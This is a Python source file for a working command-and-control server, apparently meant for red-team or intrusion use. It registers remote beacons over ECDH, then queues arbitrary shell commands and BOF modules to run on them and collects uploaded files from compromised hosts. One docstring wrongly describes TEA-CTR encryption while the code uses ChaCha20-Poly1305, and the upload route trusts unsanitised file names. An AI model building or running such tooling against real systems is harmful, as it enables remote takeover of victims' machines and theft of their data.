#!/usr/bin/env python3
import os, re, sys, json, uuid, threading, logging, struct, hashlib
from datetime import datetime
from flask import Flask, request

from cryptography.hazmat.primitives.asymmetric.ec import (
    ECDH, generate_private_key, SECP256R1, EllipticCurvePublicKey
)
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

# ---------------------------------------------------------------------------
# Flask app
# ---------------------------------------------------------------------------
app = Flask(__name__)
logging.getLogger("werkzeug").setLevel(logging.ERROR)

# agents[aid] = { ...metadata..., "key": bytes }
agents        = {}
command_queue = {}
BOF_DIR       = "bofs"
UPLOAD_DIR    = "uploads"
STATE_FILE    = "agents.json"

_print_lock     = threading.Lock()
_current_prompt = ""

# ---------------------------------------------------------------------------
# ChaCha20-Poly1305 AEAD encryption — key is derived per-agent via ECDH
# ---------------------------------------------------------------------------

def decrypt_request(key: bytes, data: bytes) -> bytes:
    """Decrypt ChaCha20-Poly1305: [12-byte nonce][ciphertext+tag]"""
    if len(data) < 12:
        return b''
    nonce = data[:12]
    ciphertext = data[12:]
    try:
        cipher = ChaCha20Poly1305(key)
        return cipher.decrypt(nonce, ciphertext, None)
    except Exception:
        return b''

def encrypt_response(key: bytes, plaintext: bytes) -> bytes:
    """Encrypt ChaCha20-Poly1305: [12-byte nonce][ciphertext+tag]"""
    nonce = os.urandom(12)
    cipher = ChaCha20Poly1305(key)
    ciphertext = cipher.encrypt(nonce, plaintext, None)
    return nonce + ciphertext

# ---------------------------------------------------------------------------
# ECDH-P256 key exchange
# Beacon sends:  0x04 || X[32] || Y[32]  (65-byte X9.62 uncompressed pubkey)
# Server replies: 0x04 || X[32] || Y[32] || uuid_str  (65 + 36 = 101 bytes)
# Both sides derive: SHA-256(shared_secret)[:32]  →  32-byte ChaCha20-Poly1305 key
# ---------------------------------------------------------------------------

def ecdh_derive_session_key(our_priv, peer_pub_bytes: bytes) -> bytes:
    """Given our private key and the peer's raw 65-byte X9.62 pubkey, return the 32-byte ChaCha20-Poly1305 key."""
    peer_pub    = EllipticCurvePublicKey.from_encoded_point(SECP256R1(), peer_pub_bytes)
    shared      = our_priv.exchange(ECDH(), peer_pub)
    return hashlib.sha256(shared).digest()  # full 32 bytes for ChaCha20-Poly1305

# ---------------------------------------------------------------------------
# Terminal primitives (unchanged)
# ---------------------------------------------------------------------------
W  = 72
HR = "─" * W
HL = "━" * W

RESET  = "\033[0m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RED    = "\033[38;5;196m"
GREEN  = "\033[38;5;82m"
YELLOW = "\033[38;5;220m"
CYAN   = "\033[38;5;117m"
GREY   = "\033[38;5;244m"
WHITE  = "\033[38;5;255m"

def _no_color():
    return not sys.stdout.isatty() or os.environ.get("NO_COLOR")

def c(text, color):
    return text if _no_color() else f"{color}{text}{RESET}"

def ts():
    return datetime.now().strftime("%H:%M:%S")

_TAGS = {
    "ok"  : lambda: c("  OK  ", GREEN),
    "err" : lambda: c(" ERR  ", RED),
    "send": lambda: c(" SEND ", CYAN),
    "recv": lambda: c(" RECV ", CYAN),
    "up"  : lambda: c("  UP  ", YELLOW),
    "down": lambda: c(" DOWN ", YELLOW),
    "info": lambda: c(" INFO ", GREY),
    "warn": lambda: c(" WARN ", YELLOW),
}

def _reprint_prompt():
    if _current_prompt:
        sys.stdout.write(_current_prompt)
        sys.stdout.flush()

def log(msg, level="info"):
    tag = _TAGS.get(level, _TAGS["info"])()
    with _print_lock:
        print(f" {c(ts(), GREY)} {tag}  {msg}")

def async_log(msg, level="info"):
    tag = _TAGS.get(level, _TAGS["info"])()
    with _print_lock:
        sys.stdout.write("\r\033[2K")
        print(f" {c(ts(), GREY)} {tag}  {msg}")
        _reprint_prompt()

def async_output(lines):
    with _print_lock:
        sys.stdout.write("\r\033[2K")
        for line in lines:
            print(line)
        _reprint_prompt()

def header(title, sub=None):
    print(f"\n{c(HL, DIM)}")
    print(f"  {c(title, BOLD + WHITE)}")
    if sub:
        print(f"  {c(sub, GREY)}")
    print(c(HR, DIM))

def row(k, v, w=24):
    print(f"  {c(k.ljust(w), GREY)}{v}")

def _visible_len(s):
    return len(re.sub(r'\033\[[0-9;]*m', '', str(s)))

def _pad(s, width):
    s = str(s)
    return s + (" " * max(width - _visible_len(s), 0))

def table_header(*cols):
    widths, labels = zip(*cols)
    line = "  " + "".join(l.ljust(w) for l, w in zip(labels, widths))
    print(c(line, DIM))
    print(c("  " + HR, DIM))

def table_row(*cols):
    widths, values = zip(*cols)
    print("  " + "".join(_pad(v, w) for v, w in zip(values, widths)))

def section_end():
    print(c(HR, DIM) + "\n")

def fmt_bytes(n):
    for u in ("B", "KB", "MB", "GB"):
        if n < 1024:
            return f"{n:.1f} {u}"
        n /= 1024
    return f"{n:.1f} TB"

def fmt_age(dt):
    s = (datetime.now() - dt).total_seconds()
    if s < 60:   return f"{int(s)}s ago"
    if s < 3600: return f"{int(s/60)}m ago"
    return f"{int(s/3600)}h ago"

def agent_status(dt):
    s = (datetime.now() - dt).total_seconds()
    if s < 15:  return c("LIVE", GREEN)
    if s < 120: return c("IDLE", YELLOW)
    return c("DEAD", RED)

def save_state():
    try:
        with open(STATE_FILE, "w") as f:
            json.dump(
                {aid: {"registered": a["registered"].isoformat(),
                       "outputs":    len(a["output_history"])}
                 for aid, a in agents.items()},
                f, indent=2
            )
    except Exception as e:
        async_log(f"State save failed: {e}", "err")

def new_agent(key: bytes) -> dict:
    return {
        "key":            key,
        "last_seen":      datetime.now(),
        "registered":     datetime.now(),
        "output_history": [],
        "last_output":    "",
        "command_count":  0,
        "bytes_sent":     0,
        "bytes_received": 0,
    }

# ---------------------------------------------------------------------------
# Flask routes
# ---------------------------------------------------------------------------

@app.route("/register", methods=["POST"])
def route_register():
    """
    ECDH handshake — plaintext, no encryption yet.

    Request body:  65 bytes  — beacon's X9.62 uncompressed P-256 pubkey
    Response body: 65 bytes  — server's X9.62 uncompressed P-256 pubkey
                 + 36 bytes  — agent UUID (ASCII)
    Both sides then derive: TEA key = SHA-256(ECDH shared secret)[:16]
    All subsequent traffic is TEA-CTR encrypted with that key.
    """
    beacon_pub_bytes = request.data

    if len(beacon_pub_bytes) != 65 or beacon_pub_bytes[0] != 0x04:
        async_log("Bad /register — expected 65-byte X9.62 pubkey", "err")
        return b"bad request", 400

    try:
        # Generate ephemeral server keypair
        server_priv      = generate_private_key(SECP256R1())
        server_pub_bytes = server_priv.public_key().public_bytes(
            Encoding.X962, PublicFormat.UncompressedPoint
        )
        # Derive the per-agent ChaCha20-Poly1305 key (32 bytes)
        session_key = ecdh_derive_session_key(server_priv, beacon_pub_bytes)
    except Exception as e:
        async_log(f"ECDH failed: {e}", "err")
        return b"error", 500

    aid                = str(uuid.uuid4())
    agents[aid]        = new_agent(session_key)
    command_queue[aid] = None

    async_log(
        f"Agent registered  id={c(aid[:8], CYAN)}  "
        f"key={c(session_key.hex(), DIM)}",
        "ok"
    )
    save_state()

    # server pubkey (65) + agent UUID (36)
    return server_pub_bytes + aid.encode(), 200, {"Content-Type": "application/octet-stream"}


@app.route("/checkin/<aid>", methods=["POST"])
def route_checkin(aid):
    if aid not in agents:
        return b"unknown", 404

    a   = agents[aid]
    key = a["key"]
    a["last_seen"] = datetime.now()

    plain = decrypt_request(key, request.data)
    raw   = plain.decode("utf-8", errors="ignore").strip()

    if raw:
        a["bytes_received"] += len(request.data)
        a["output_history"].append({"timestamp": datetime.now(), "output": raw})
        a["last_output"] = raw

        lines = [
            f"\n{c(HL, DIM)}",
            f"  {c('OUTPUT', BOLD + WHITE)}  {c(aid[:8], CYAN)}  {c(ts(), GREY)}",
            c(HR, DIM),
        ]
        for line in raw.splitlines():
            lines.append(f"  {line}")
        lines.append(c(HR, DIM))
        async_output(lines)

    cmd = command_queue.get(aid)
    if cmd:
        command_queue[aid]  = None
        a["command_count"] += 1
        a["bytes_sent"]    += len(cmd)
        preview = cmd[:55] + ("..." if len(cmd) > 55 else "")
        async_log(f"Dispatch  {c(aid[:8], CYAN)}  {c(preview, DIM)}", "send")
        return encrypt_response(key, cmd.encode()), 200, {"Content-Type": "application/octet-stream"}

    return encrypt_response(key, b""), 200


@app.route("/getbof/<aid>/<name>", methods=["POST"])
def route_getbof(aid, name):
    if aid not in agents:
        return b"unknown", 404

    key  = agents[aid]["key"]
    base = os.path.basename(name)
    for suffix in (".obj", ".o"):
        if base.endswith(suffix):
            base = base[:-len(suffix)]
            break
    path = os.path.join(BOF_DIR, base + ".obj")

    if not os.path.exists(path):
        async_log(f"BOF not found: {base}", "err")
        return encrypt_response(key, b"not found"), 404

    with open(path, "rb") as f:
        data = f.read()

    agents[aid]["bytes_sent"] += len(data)
    async_log(f"BOF served  {c(base, CYAN)}  {fmt_bytes(len(data))}  to {c(aid[:8], CYAN)}", "down")
    return encrypt_response(key, data), 200, {"Content-Type": "application/octet-stream"}


@app.route("/upload/<aid>/<filename>", methods=["POST"])
def route_upload(aid, filename):
    if aid not in agents:
        return b"unknown", 404

    key   = agents[aid]["key"]
    plain = decrypt_request(key, request.data)
    dest  = os.path.join(UPLOAD_DIR, aid[:8])
    os.makedirs(dest, exist_ok=True)
    with open(os.path.join(dest, filename), "wb") as f:
        f.write(plain)

    agents[aid]["bytes_received"] += len(request.data)
    async_log(f"Upload  {c(filename, CYAN)}  {fmt_bytes(len(plain))}  from {c(aid[:8], CYAN)}", "up")
    return encrypt_response(key, b"OK"), 200

# unused right now just not important
@app.route("/download/<aid>/<filename>", methods=["POST"])
def route_download(aid, filename):
    if aid not in agents:
        return b"unknown", 404

    key = agents[aid]["key"]
    if not os.path.exists(filename):
        async_log(f"File not found: {filename}", "err")
        return encrypt_response(key, b"not found"), 404

    with open(filename, "rb") as f:
        data = f.read()

    agents[aid]["bytes_sent"] += len(data)
    async_log(f"Download  {c(filename, CYAN)}  {fmt_bytes(len(data))}  to {c(aid[:8], CYAN)}", "down")
    return encrypt_response(key, data), 200, {"Content-Type": "application/octet-stream"}


# ---------------------------------------------------------------------------
# BOF argument packing
# ---------------------------------------------------------------------------
try:
    from beacon_generate import BeaconPack
except ImportError:
    sys.exit("FATAL  beacon_generate.py not found")

# ---------------------------------------------------------------------------
# CLI commands (unchanged)
# ---------------------------------------------------------------------------
def cmd_list():
    header("AGENTS")
    if not agents:
        print(f"  {c('no agents registered', GREY)}\n")
        return
    table_header(
        (10, "ID"),
        (8,  "STATUS"),
        (14, "LAST SEEN"),
        (8,  "CMDS"),
        (12, "SENT"),
        (12, "RECV"),
    )
    for aid, a in agents.items():
        table_row(
            (10, c(aid[:8], CYAN)),
            (8,  agent_status(a["last_seen"])),
            (14, fmt_age(a["last_seen"])),
            (8,  str(a["command_count"])),
            (12, fmt_bytes(a["bytes_sent"])),
            (12, fmt_bytes(a["bytes_received"])),
        )
    section_end()

def cmd_bofs():
    header("BOF MODULES", sub=os.path.abspath(BOF_DIR))
    if not os.path.isdir(BOF_DIR):
        os.makedirs(BOF_DIR, exist_ok=True)
        print(f"  {c('directory created — drop .obj files here', GREY)}\n")
        return
    files = [f for f in os.listdir(BOF_DIR) if f.endswith((".obj", ".o"))]
    if not files:
        print(f"  {c('no modules found', GREY)}\n")
        return
    table_header((32, "NAME"), (12, "SIZE"), (10, "FORMAT"))
    for f in sorted(files):
        ext  = ".obj" if f.endswith(".obj") else ".o"
        base = f[:-len(ext)]
        size = os.path.getsize(os.path.join(BOF_DIR, f))
        table_row((32, c(base, WHITE)), (12, fmt_bytes(size)), (10, c(ext, GREY)))
    print(f"\n  {c(str(len(files)) + ' module(s)', GREY)}")
    section_end()

def cmd_info(aid):
    a = agents[aid]
    header("AGENT INFO", sub=aid)
    row("ID",             c(aid, CYAN))
    row("Short ID",       c(aid[:8], CYAN))
    row("Status",         agent_status(a["last_seen"]))
    row("Session key",    c(a["key"].hex(), DIM))
    row("Registered",     a["registered"].strftime("%Y-%m-%d %H:%M:%S"))
    row("Last seen",      a["last_seen"].strftime("%H:%M:%S") + f"  ({fmt_age(a['last_seen'])})")
    print()
    row("Commands",       str(a["command_count"]))
    row("Output entries", str(len(a["output_history"])))
    row("Bytes sent",     fmt_bytes(a["bytes_sent"]))
    row("Bytes received", fmt_bytes(a["bytes_received"]))
    if a["last_output"]:
        print(f"\n  {c('last output preview', GREY)}")
        print(c("  " + HR, DIM))
        for line in a["last_output"][:400].splitlines():
            print(f"  {line}")
    section_end()

def cmd_stats(aid):
    a      = agents[aid]
    uptime = (datetime.now() - a["registered"]).total_seconds()
    header("STATISTICS", sub=aid[:8])
    row("Uptime",    f"{int(uptime)}s  ({int(uptime/60)}m)")
    row("Commands",  str(a["command_count"]))
    row("Outputs",   str(len(a["output_history"])))
    row("Sent",      fmt_bytes(a["bytes_sent"]))
    row("Received",  fmt_bytes(a["bytes_received"]))
    if a["command_count"]:
        row("Avg / cmd", fmt_bytes(a["bytes_sent"] / a["command_count"]))
    section_end()

def cmd_output(aid, n=10):
    hist = agents[aid]["output_history"]
    if not hist:
        print(f"  {c('no output recorded', GREY)}\n")
        return
    entries = hist[-n:]
    header("OUTPUT HISTORY", sub=f"showing {len(entries)} of {len(hist)}")
    for entry in entries:
        print(f"  {c(entry['timestamp'].strftime('%H:%M:%S'), GREY)}")
        print(c("  " + HR, DIM))
        for line in entry["output"].splitlines():
            print(f"  {line}")
        print()
    section_end()

def cmd_help():
    header("COMMAND REFERENCE")
    sections = [
        ("GLOBAL", [
            ("list",               "list all agents"),
            ("bofs",               "list available BOF modules"),
            ("use <id>",           "select agent by full or partial ID"),
            ("clear",              "clear the terminal"),
            ("help",               "show this reference"),
            ("exit",               "shutdown server"),
        ]),
        ("AGENT  (requires: use <id>)", [
            ("shell <cmd>",        "execute shell command"),
            ("bof <name> [args]",  "execute BOF module"),
            ("output [n]",         "show last N outputs  (default 10)"),
            ("info",               "agent details + session key"),
            ("stats",              "session statistics"),
            ("back",               "deselect agent"),
        ]),
        ("BOF ARGUMENT TYPES", [
            ("s:<value>",          "UTF-8 string"),
            ("w:<value>",          "UTF-16LE wide string"),
            ("i:<value>",          "32-bit integer"),
            ("h:<value>",          "16-bit short"),
            ("<value>",            "no prefix defaults to string"),
        ]),
    ]
    for title, entries in sections:
        print(f"  {c(title, BOLD + WHITE)}")
        for cmd, desc in entries:
            print(f"  {c(cmd.ljust(28), CYAN)}{c(desc, GREY)}")
        print()
    section_end()

def send_cmd(aid, cmd):
    command_queue[aid] = cmd
    log(f"Queued  agent={c(aid[:8], CYAN)}", "info")

def send_bof(aid, name, args_str=""):
    bp = BeaconPack()
    for token in (args_str or "").split():
        if ":" in token:
            t, v = token.split(":", 1)
            if   t == "s": bp.addstr(v)
            elif t == "w": bp.addWstr(v)
            elif t == "i": bp.addint(int(v))
            elif t == "h": bp.addshort(int(v))
            else:
                log(f"Unknown arg type '{t}'  valid: s / w / i / h", "err")
                return
        else:
            bp.addstr(token)
    send_cmd(aid, f"BOF:{name}:{bp.getbuffer().hex()}")

def resolve_agent(partial):
    matches = [a for a in agents if a.startswith(partial)]
    if not matches:
        return None, f"no agent matched: {partial}"
    if len(matches) > 1:
        return None, f"ambiguous ID  matches={[m[:8] for m in matches]}"
    return matches[0], None

def interactive_shell():
    global _current_prompt
    current = None

    while True:
        try:
            prompt = (
                f" {c(current[:8], CYAN)} {c('>', GREY)} "
                if current else f" {c('>', GREY)} "
            )
            with _print_lock:
                _current_prompt = prompt
                sys.stdout.write(prompt)
                sys.stdout.flush()

            line = sys.stdin.readline()
            if not line:
                break
            line = line.strip()
            if not line:
                continue

            parts = line.split(maxsplit=1)
            cmd   = parts[0].lower()
            args  = parts[1] if len(parts) > 1 else ""

            if cmd == "exit":
                print(f"\n  {c('shutting down', GREY)}\n")
                save_state()
                break
            elif cmd == "clear":
                os.system("cls" if os.name == "nt" else "clear")
            elif cmd == "list":
                cmd_list()
            elif cmd == "bofs":
                cmd_bofs()
            elif cmd == "help":
                cmd_help()
            elif cmd == "use":
                if not args:
                    log("usage: use <agent_id>", "err")
                    continue
                aid, err = resolve_agent(args)
                if err:
                    log(err, "err")
                else:
                    current = aid
                    log(f"selected {c(aid[:8], CYAN)}", "ok")
            elif cmd == "back":
                if current:
                    log(f"deselected {c(current[:8], CYAN)}", "ok")
                    current = None
                else:
                    log("no agent selected", "warn")
            elif cmd in ("shell", "bof", "output", "info", "stats"):
                if not current:
                    log("no agent selected  (use: use <id>)", "err")
                    continue
                if cmd == "shell":
                    if not args:
                        log("usage: shell <command>", "err")
                    else:
                        send_cmd(current, args)
                elif cmd == "bof":
                    if not args:
                        log("usage: bof <name> [type:arg ...]", "err")
                    else:
                        bof_parts = args.split(maxsplit=1)
                        send_bof(current, bof_parts[0],
                                 bof_parts[1] if len(bof_parts) > 1 else "")
                elif cmd == "output":
                    n = int(args) if args.isdigit() else 10
                    cmd_output(current, n)
                elif cmd == "info":
                    cmd_info(current)
                elif cmd == "stats":
                    cmd_stats(current)
            else:
                log(f"unknown command: {cmd}  (type help)", "err")

        except KeyboardInterrupt:
            print()
            log("interrupted  (exit to quit, back to deselect)", "warn")
            current = None
        except Exception as e:
            log(str(e), "err")
            import traceback; traceback.print_exc()

def banner():
    print(f"\n{c(HL, DIM)}")
    print(f"  {c('C2 SERVER', BOLD + WHITE)}")
    print(f"{c(HL, DIM)}\n")

if __name__ == "__main__":
    os.makedirs(BOF_DIR,    exist_ok=True)
    os.makedirs(UPLOAD_DIR, exist_ok=True)

    banner()

    def _flask():
        app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False, threaded=True)

    threading.Thread(target=_flask, daemon=True).start()

    log("listening    0.0.0.0:8080", "ok")
    log(f"bof dir      {os.path.abspath(BOF_DIR)}", "ok")
    log(f"upload dir   {os.path.abspath(UPLOAD_DIR)}", "ok")
    print()

    try:
        interactive_shell()
    except KeyboardInterrupt:
        print()
    finally:
        save_state()
        log("stopped", "ok")
        print()